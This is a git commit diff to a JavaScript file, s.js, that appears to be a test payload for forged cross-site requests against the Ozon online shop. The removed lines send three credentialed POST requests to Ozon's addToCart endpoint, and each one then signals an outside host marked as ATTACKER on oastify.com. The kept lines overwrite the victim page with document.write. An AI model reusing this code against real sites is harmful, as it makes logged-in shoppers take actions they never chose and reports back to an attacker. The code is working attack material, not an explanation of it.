0e5f2e04b8e3b5c7034ecb7490e982e90efcd423
GMchik <chupanovgadji@gmail.com>
2026-02-27 14:34:30 +0300

    Update s.js

--- s.js
+++ s.js
@@ -1,35 +1,4 @@
-alert('new_3');
-document.documentElement.innerHTML = '<html><body><h1>Тест!</h1><p>Через innerHTML сработает точно.</p></body></html>';
+alert('new_4');
 document.open();
 document.write('<html><body><h1>Тест!</h1><p>Явный open() помогает.</p></body></html>');
 document.close();
-var ATTACKER = 'https://dm3pjhjkpudpos6lmt41kc90xr3iref3.oastify.com';
-
-fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'User-Agent': 'Android/11.0 Firefox/140.0' },
-    body: JSON.stringify([{ id: 1215057882, quantity: 2 }]),
-    credentials: 'include',
-}).then(function() {
-    navigator.sendBeacon(ATTACKER + '?cart0=fired');
-});
-
-fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'User-Agent': 'Android/11.0 Firefox/140.0' },
-    body: JSON.stringify([{ id: 1215057882, quantity: 2 }]),
-    credentials: 'include',
-    mode: 'cors'
-}).then(function() {
-    navigator.sendBeacon(ATTACKER + '?cart1=fired');
-});
-
-fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'User-Agent': 'Android/11.0 Firefox/140.0' },
-    body: JSON.stringify([{ id: 1215057882, quantity: 2 }]),
-    credentials: 'include',
-    mode: 'no-cors'
-}).then(function() {
-    navigator.sendBeacon(ATTACKER + '?cart1=fired');
-});
